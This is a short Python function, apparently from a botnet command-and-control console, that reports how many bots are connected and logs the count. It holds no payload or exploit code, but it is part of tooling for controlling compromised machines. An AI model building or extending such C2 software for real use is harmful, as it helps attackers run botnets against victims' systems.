import C2.func.utils.logger

def do_amount(self, inp):

    """Tells you the amount of Bots connected to C2."""

    bot_connection = self.bot_connection
    connection_count = bot_connection.get_connection_count()
    C2.func.utils.logger.log(self, f"Currently there are {connection_count} bots", "generic")